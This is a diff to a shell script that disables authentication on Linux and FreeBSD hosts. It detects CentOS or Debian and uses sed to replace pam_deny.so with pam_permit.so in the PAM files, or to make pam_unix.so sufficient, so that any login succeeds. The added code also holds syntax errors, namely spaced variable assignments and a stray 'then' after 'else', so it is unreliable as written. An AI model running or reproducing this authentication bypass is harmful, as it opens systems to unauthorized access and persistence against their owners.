@@ -4,10 +4,26 @@
 
 OS = $(uname)
 
+which lsb_release
+if [ "$?" == "1" ]
+then
+	distro = "CentOS"
+else
+then
+	distro = "Debian"
+fi
+
 if [ "$OS" == "Linux"]
 then
-	#CentOS
-	PAM_FILE="/etc/pam.d/password_auth"
+	if [ "$distro" == "CentOS" ]
+	then	
+		#CentOS
+		PAM_FILE="/etc/pam.d/password_auth"
+	elif [ "$distro" == "Debian" ]
+	then
+		# tested on Kali
+		PAM_FILE="/etc/pam.d/common-auth"
+	fi
 elif [ "$OS" == "FreeBSD"]
 then
 	PAM_FILE="/etc/pam.d/sshd"
@@ -33,7 +49,13 @@ fi
 
 if [ "$OS" == "Linux" ]
 then
-	sed -i -e 's/auth	required	pam_deny.so/auth	required	pam_permit.so/' "$PAM_FILE"
+	if [ "$distro" == "CentOS" ]
+	then
+		sed -i -e 's/auth	required	pam_deny.so/auth	required	pam_permit.so/' "$PAM_FILE"
+	elif [ "$distro" == "Debian" ]
+	then
+		sed -i -e 's/auth	requisite	pam_deny.so/auth	requisite	pam_permit.so/' "$PAM_FILE"
+	fi
 elif [ "$OS" == "FreeBSD" ]
 then
 	sed -i -e 's/auth	required	pam_unix.so/auth	sufficient	pam_unix.so/' "$PAM_FILE"
